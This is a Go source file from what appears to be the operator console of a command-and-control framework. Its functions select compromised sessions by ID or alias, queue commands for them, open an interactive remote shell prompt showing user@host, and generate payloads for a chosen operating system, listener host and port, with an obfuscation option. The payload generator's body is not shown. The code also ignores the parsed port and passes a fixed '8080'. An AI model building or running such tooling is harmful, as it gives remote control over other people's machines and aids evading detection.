package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

func exec_command(parsed_user_input []string) {
	if len(parsed_user_input) != 3 {
		return
	}

	continue_shell = false

	var sessionid string = parsed_user_input[1]
	var command string = parsed_user_input[2]
	var found bool

	for i:=0;i<len(sessions);i++ {
		if sessions[i].SessionId == sessionid || sessions[i].Alias == sessionid {
			found = true
			sessions[i].Job = command
			selected_session = sessions[i].SessionId
		}
	}

	if !found {
		fmt.Printf("%s", "Session was not found.")
		return
	}

	for !continue_shell {
		time.Sleep(time.Millisecond*350)
	}
}

func shell_command(parsed_user_input []string) {
	if len(parsed_user_input) != 2 {
		return
	}

	var sessionid string = parsed_user_input[1]				
	var sess session

	var found bool
	for i:=0;i<len(sessions);i++ {
		if sessions[i].SessionId == sessionid || sessions[i].Alias == sessionid {
			found = true
			sess = sessions[i]
		}
	}

	if !found {
		fmt.Printf("%s", "Session was not found.")
		return
	}
	
	for {
		fmt.Printf("%s", "\n"+sess.Username+"@"+sess.Hostname)

		if sess.OperatingSystem == "windows" {
			fmt.Printf("> ")
		} else {
			fmt.Printf("$ ")
		}

		var inp string = input()

		continue_shell = false
		
		var command string = inp

		if command == "exit" {
			break
		}

		for i:=0;i<len(sessions);i++ {
			if sessions[i].SessionId == sessionid || sessions[i].Alias == sessionid {
				sessions[i].Job = command
				selected_session = sessions[i].SessionId
			}
		}

		for !continue_shell {
			time.Sleep(time.Millisecond*350)
		}
	}
}

func generate_command(parsed_user_input []string) {
	var os string
    var lhost string
	var lport string
	var obfuscate bool = false
    for i:=0;i<len(parsed_user_input);i++ {
    	var arg string = parsed_user_input[i]
        if strings.Contains(arg, "=") {
            var split []string = strings.Split(arg, "=")
            switch split[0] {
            	case("os"):
                    os = split[1]
                case("lhost"):
                	lhost = split[1]
				case("lport"):
					lport = split[1]
            }
        } else if arg == "obfuscate" {
			obfuscate = true
		}
    }
    
	if len(os) < 1 || len(lhost) < 1 || len(lport) < 1 {
        fmt.Printf("%s", "Usage: generate "+Fore.RED+"os=<os> lhost=<lhost> lport=<lport>"+Fore.RESET)
        return
    }
	
	var gened string = generate(os, lhost, "8080", obfuscate)
	
	if gened == "OSNx0" {
		Log.Error("Operating System is not supported.")
	} else {
		fmt.Printf("%s", gened)
	}
}

func alias_command(parsed_user_input []string) {
	if len(parsed_user_input) != 3 {
		fmt.Printf("%s", "Usage: alias "+Fore.RESET+"<session> <alias>"+Fore.RESET)
	}

	var found bool = false
	for i:=0;i<len(sessions);i++ {
		if sessions[i].SessionId == parsed_user_input[1] {
			found = true
			sessions[i].Alias=parsed_user_input[2]
		}
	}

	if !found {
		fmt.Printf("Sesssion was not found.")
	}
}

func reset_command() {
	Log.Warning("All aliases will be removed, do you want to continue [Y/*] ")

	var uin string = input()
	if strings.ToLower(uin) == "y" {
		sessions = []session{}
		Log.Info("Sesssion list was reset.\n")
	} else {
		Log.Info("Reset was Successfuly cancled.\n")
	}
}

func serverinfo_command() {
	Log.Info("VERSION -> "+Fore.YELLOW+Server_Info["version"]+Fore.RESET+"\n")
	Log.Info("ENGINE  -> "+Fore.YELLOW+Server_Info["engine_server"]+Fore.RESET+"\n")
}

func clear_command() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func help_command(parsed_user_input []string) {
	if len(parsed_user_input) > 1 {
		help.help(parsed_user_input[1])
	} else {
		help.display_all()
	}
}